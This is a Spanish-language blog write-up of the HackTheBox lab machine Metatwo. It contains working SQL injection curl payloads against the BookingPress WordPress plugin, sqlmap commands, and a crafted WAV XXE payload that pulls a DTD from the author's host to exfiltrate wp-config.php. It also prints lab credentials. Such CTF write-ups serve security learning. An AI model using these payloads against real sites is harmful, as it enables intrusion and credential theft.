---
layout      : post
title       : "Metatwo - HackTheBox"
author      : elc4br4
image       : /assets/images/HTB/Metatwo-HackTheBox/Metatwo.jpg
category    : [ htb ]
tags        : [ Linux ]
description : Máquina easy de la plataforma HackTheBox
---

Máquina easy de la plataforma HackTheBox

![](/assets/images/HTB/Metatwo-HackTheBox/metatwo2.webp)

![](/assets/images/HTB/Metatwo-HackTheBox/metatwo-rating.webp)

***
**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
2. [Enumeración](#enumeración).
    * [Enumeración Web](#enum-web).
3. [Explotación](#explotación).
4. [Escalada de Privilegios](#privesc). 
    * [GPG](#gpg).
    
***

# Reconocimiento [#](reconocimiento) {#reconocimiento}

## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}

Como siempre comienzo lanzando un reconocimiento de puertos, pero antes de ello lanzo la herramienta whichsystem para saber ante que sistema operativo me voy a enfrentar.

![](/assets/images/HTB/Metatwo-HackTheBox/whichsystem.webp)

> Me enfrento a una máquina Linux.

A continuación ya procedo a lanzar el escaneo de puertos para averiguar por donde puedo comenzar la intrusión al sistema.

Lanzo el escaneo con el siguiente comando:

```bash
# Primer escaneo para sacar los puertos abiertos de la máquina

nmap -p- -Pn -n --min-rate 5000 10.10.11.186 --open -vvv

# Segundo escaneo para sacar la versión de lo que se ejecuta en cada puerto y lanzamiento de una serie de scripts básicos de nmap contra dichos puertos.

nmap -p80,22,21 -sCV -n 10.10.11.186
```

![](/assets/images/HTB/Metatwo-HackTheBox/nmap.webp)

Saco los datos relevantes a una tabla para poder visualizarlo mejor.

> Recordar siempre que el orden es de lo más importante a la hora de realizar un CTF y tener la información relevante aonotada y organizada.

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 21     | ftp      | ProFTPD Server |
| 22     | ssh      | OpenSSH 8.4p1 Ubuntu |
| 80     | http     | nginx 1.18.0 |

* Encuentro el Dominio `metapress.htb`.
* No hay acceso anónimo en el servidor FTP.

Añado el dominio al archivo hosts y continuo.

A continuación procedo a enumerar el servidor web y ver que tenemos por ahí.

# Enumeración [#](enumeración) {#enumeración}

## Enumeración Web [🔢](#enum-web) {#enum-web}

Accedo al servidor web y encuentro un Wordpress bastante austero.

![](/assets/images/HTB/Metatwo-HackTheBox/web1.webp)

Hago click en el enlace que me lleva a la ruta /events.

Dentro de esta ruta tampoco veo nada que me pueda servir.

![](/assets/images/HTB/Metatwo-HackTheBox/web2.webp)

Abro el código fuente de la página para ver si podría haber alguna ruta o algo de interés.

# Explotación [#](explotación) {#explotación}


Y buscando encontré un plugin que podría ser vulnerable y podría servirme para conseguir acceso al sistema.

![](/assets/images/HTB/Metatwo-HackTheBox/web3.webp)

> Plugin bookingpress

Buscando vulnerabilidades encuentro el siguiente recurso.

[https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)

Aquí tenemos el proceso de explotación a través de una inyección sql.

```bash
# Prueba de Concepto

# Create a new "category" and associate it with a new "service" via the BookingPress admin menu

(/wp-admin/admin.php?page=bookingpress_services)

# Create a new page with the "[bookingpress_form]" shortcode embedded (the "BookingPress Step-by-step Wizard Form")

# Visit the just created page as an unauthenticated user and extract the "nonce" 

(view source -> search for "action:'bookingpress_front_get_category_services'")

# Invoke the following curl command

curl -i 'https://example.com/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services_wpnonce=<ELIDQUEDEBEMOSBUSCAR>&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'

# Time based payload:  

curl -i 'https://example.com/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=<ELIDQUEDEBEMOSBUSCAR>&category_id=1&total_service=1) AND (SELECT 9578 FROM (SELECT(SLEEP(5)))iyUp)-- ZmjH' 
```

Parece un poco lío pero es muy simple, solo he de seguir estos pasos.

* Primero debo buscar el parámetro wpnonce.

![](/assets/images/HTB/Metatwo-HackTheBox/wpnonce.webp)

Ahí tengo el parámetro wpnonce, ahora que ya lo tengo lanzo uno de los comandos que tenemos en la prueba de concepto para obtener la versión de la base de datos incluyendo el parámetro wpnonce.

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services_wpnonce=<WPNONCE>&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

![](/assets/images/HTB/Metatwo-HackTheBox/sql1.webp)

Ahí tengo la versión y el nombre de la base de datos MariaDB 10.5.15.

Pero la inyección la relizaré con sqlmap ya que nunca he subido ningún writeup tirando de sqlmap asique hoy será la primera vez.

* Lo primero que hay que hacer es capturar con burpsuite la petición anterior.

![](/assets/images/HTB/Metatwo-HackTheBox/request.webp)

> Con el parámetro -x lo envío a la dirección 127.0.0.1 al puerto 8080 para que el burpsuite capture la petición.

* Una vez capturada elimino la parte de la inyección y lo guardo en un archivo.

![](/assets/images/HTB/Metatwo-HackTheBox/burp.webp)

Al guardarlo en el archivo queda de la siguiente forma.

![](/assets/images/HTB/Metatwo-HackTheBox/request2.webp)

* Y ahora con la ayuda de sqlmap comienzo lanzando el siguiente comando.

```bash
# Comando para descubrir el nombre de la base de datos
sqlmap -r archivo.txt --batch --threads 5 --dbs
```
![](/assets/images/HTB/Metatwo-HackTheBox/bdd.webp)

* Ya tengo el nombre de la base de datos (blog), ahora toca descubrir las tablas que hay dentro de la misma.

```bash
# Comando para descubrir las de la base de datos blog
sqlmap -r archivo.txt --batch --threads 5 -D blog --tables
```

![](/assets/images/HTB/Metatwo-HackTheBox/sqlusers.webp)

Tengo varias tablas, pero la que me interesa es la tabla wp_users.

* Ahora que ya tengo la tabla wp_users ya solo me queda ver las columnas que hay dentro de la tabla.

```bash
# Comando para descubrir las columnas de la base de datos blog de la tabla wp_users.
sqlmap -r archivo.txt --batch --threads 5 -D blog -T wp_users --columns
```

![](/assets/images/HTB/Metatwo-HackTheBox/columnas.webp)

Y encuentro dos usuarios y dos hashes.

![](/assets/images/HTB/Metatwo-HackTheBox/hashes.webp)

* Intento crackear los hashes pero solo consigo crackear el del usuario manager usando john the ripper.

![](/assets/images/HTB/Metatwo-HackTheBox/cracked.webp)

Ahora intento loguearme en Wordpress con las credenciales encontradas.

![](/assets/images/HTB/Metatwo-HackTheBox/wplogin.webp)

Consigo loguearme y lo primero que hago es buscar la versión de Wordpress para buscar alguna posible vulnerabilidad.

![](/assets/images/HTB/Metatwo-HackTheBox/versionwp.webp)

> Versión Wordpress 5.6.2

Voy a buscar alguna vulnerabilidad para esta versión a través de searchsploit.

![](/assets/images/HTB/Metatwo-HackTheBox/searchsploit.webp)

Pero no me sirve ninguno de esos, asique paso a buscar en google a ver si encuentro algo.

Y buscando encuentro esto:

![](/assets/images/HTB/Metatwo-HackTheBox/vuln.webp)

Existe una vulnerabilidad XXE que consiste en cargar un archivo y explotar un problema de análisis XML.

Y buscando encuentro un exploit que me puede servir para explotar esta vulnerabilidad.

[https://github.com/motikan2010/CVE-2021-29447](https://github.com/motikan2010/CVE-2021-29447)

Me descargo el exploit y sigo los pasos:

```bash
# Ejecutamos el servidor web atacante
make up-mal

# Editamos el archivo evil.dtd añadiendo la ruta del archivo wp-config.php y añadiendo nuestra ip
```

![](/assets/images/HTB/Metatwo-HackTheBox/evildtd.webp)

```bash
# Generamos un archivo WAV malicioso
$ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.32:8001/evil.dtd'"'"'>%remote;%init;%trick;] >\x00'> malicious.wav

# Subimos el archivo wav al panel de subida de archivos de Wordpress
```
![](/assets/images/HTB/Metatwo-HackTheBox/wav.webp)

Y según lo subamos recibiremos en el servidor web atacante la data codificada en lo que parece ser base64.

![](/assets/images/HTB/Metatwo-HackTheBox/php1.webp)

Con un pequeño script en php podemos decodificar la data:

```php
<?php
echo zlib_decode(base64_decode('data'));
?>
```

De forma que quedaría así:

![](/assets/images/HTB/Metatwo-HackTheBox/data.webp)

Lo decodificamos y ahí tenemos el archivo wp_config.php.

```php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Y encontramos unas credenciales para loguearnos el el servidor FTP.

Asique voy a probar a ver si funcionan...

![](/assets/images/HTB/Metatwo-HackTheBox/ftp1.webp)

He podido loguearme, y dentro del servidor ftp hay dos directorios, en el directorio blog se encuentran los archivos php de Wordpress.

![](/assets/images/HTB/Metatwo-HackTheBox/blog.webp)

Pero en el directorio mailer hay un archivo llamativo.

![](/assets/images/HTB/Metatwo-HackTheBox/mailer.webp)

Me descargo el archivo send_email.php para ver que hay dentro.

Lo descargo y lo abro:

```php
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}
```

Y dentro encuentro unas credenciales que podrían servirme para loguearme a través del servicio ssh.

![](/assets/images/HTB/Metatwo-HackTheBox/ssh1.webp)

Y ya estoy en el sistema logueado como el usaurio jnelson.

Por lo tanto ahora toca escalar privilegios para convertirme en el usuario root.

# Escalada de Privilegios [#](privesc) {#privesc}

## GPG [🔍](#gpg) {#gpg}


Dentro del directorio del usuario jnelson hay un directorio llamado .passpie.

![](/assets/images/HTB/Metatwo-HackTheBox/passpie.webp)

Dentro encuentro varias cosas, primeramente veo el archivo .keys donde tenemos claves privada y pública pgp.

![](/assets/images/HTB/Metatwo-HackTheBox/publicpgp.webp)

![](/assets/images/HTB/Metatwo-HackTheBox/privatepgp.webp)

Al ver estas claves, me da que pensar que podría haber algún tipo de mensaje o de data que he de desencriptar usando estas claves pgp...

Pero sigo buscando, ya que había un directorio ssh donde encontré las claves, asique voy a ver que hay dentro.

![](/assets/images/HTB/Metatwo-HackTheBox/rootpass.webp)

Encuentro un mensaje con la contraseña del usuario root que he de decodificar usando las claves pgp.

Para esto voy a usar una herramienta online.

[https://8gwifi.org/pgpencdec.jsp](https://8gwifi.org/pgpencdec.jsp)

Introduzco el mensaje y la clave privada, para obtener el mensaje decodificado.

![](/assets/images/HTB/Metatwo-HackTheBox/rootpass2.webp)

Y obtengo lo que parece ser la contraseña del usuario root, asique intento loguearme como root usando la contraseña.

![](/assets/images/HTB/Metatwo-HackTheBox/root.webp)

Oleee!!! Ya somos root y podemos leer las flag e introducirlas en la plataforma!!!

![](/assets/images/HTB/Metatwo-HackTheBox/share.webp)










